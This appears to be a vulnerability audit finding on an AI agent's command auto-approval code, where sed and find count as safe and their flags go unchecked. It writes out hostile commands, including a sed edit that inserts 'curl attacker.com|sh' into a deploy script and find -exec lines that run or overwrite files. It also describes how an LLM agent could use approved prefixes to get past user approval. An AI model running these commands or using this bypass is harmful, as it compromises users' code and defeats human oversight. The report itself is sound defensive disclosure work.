Phase: 8
Sequence: 022
Slug: safe-commands-write-exec
Verdict: VALID
Rationale: Tracer confirmed write escalation via sed -i and arbitrary execution via find -exec after single prefix approval; Advocate found no flag analysis or dangerous-subcommand detection.
Severity-Original: HIGH
PoC-Status: pending
Pre-FP-Flag: none
Debate: archon/chamber-workspace/chamber-B/debate.md

## Summary

The `safeCommands` map (approval.go:217-222) classifies `sed` and `find` as safe for prefix-based auto-approval. However, `sed -i` performs in-place file modification (write operation) and `find -exec` can execute arbitrary commands. The `extractBashPrefix` function skips flags (line 232-233) without analyzing them for dangerous capabilities, enabling write escalation and arbitrary code execution through commands that were approved as read-only.

## Location

- `x/agent/approval.go:217-222` -- `safeCommands` map includes `sed` and `find`
- `x/agent/approval.go:232-234` -- flag skipping: `strings.HasPrefix(arg, "-")` skips all flags without analysis
- `x/agent/approval.go:94-121` -- `denyPatterns` lacks `sed -i`, `find -exec`

## Attacker Control

The LLM controls both the flags and arguments of sed/find commands. After approval of benign variants:
1. `sed -i 'sXexitXcurl attacker.com|shX' tools/deploy.sh` -- in-place modification using non-`/` delimiter to avoid path detection on sed expression
2. `find tools/ -name "*.sh" -exec bash {} \;` -- executes bash on every shell script found
3. `find tools/ -exec curl -o {} http://attacker.com/payload \;` -- overwrites files with attacker content

## Trust Boundary Crossed

User approval boundary. The user approved `sed` or `find` operations in a specific directory expecting read-only behavior. The `-i` flag converts sed to a write tool; `-exec` converts find to an execution tool.

## Impact

- **File modification**: `sed -i` can inject backdoors into scripts, configuration, Makefiles
- **Arbitrary execution**: `find -exec bash` runs arbitrary commands
- **Persistent compromise**: Modified deploy scripts, CI configs, Makefiles execute attacker code on next build/deploy

## Evidence

1. `approval.go:221`: `"sed": true` in safeCommands
2. `approval.go:220`: `"find": true` in safeCommands
3. `approval.go:232-233`: `if strings.HasPrefix(arg, "-") { continue }` -- `-i` and `-exec` flags are skipped without analysis
4. `approval.go:94-121`: denyPatterns does not include `sed -i` or `find -exec`
5. `bash.go:64`: Command executed via `bash -c` with full flag support

## Reproduction Steps

1. Start agent session, approve `sed 's/foo/bar/' tools/config.yaml` (stores `sed:tools/`)
2. LLM issues `sed -i 'sXoriginalXmaliciousX' tools/Makefile`
   - `extractBashPrefix`: baseCmd=sed, safeCommand=true
   - `-i` skipped as flag; `'sXoriginalXmaliciousX'` has no `/` so skipped as non-path
   - `tools/Makefile` found as path arg, returns `sed:tools/`
   - Matches stored prefix, auto-approved; Makefile modified in-place
3. For find -exec: approve `find tools/ -name "*.go"` (stores `find:tools/`)
4. LLM issues `find tools/ -name "*.sh" -exec bash {} \;`
   - Returns `find:tools/`, auto-approved; bash executes every .sh file in tools/
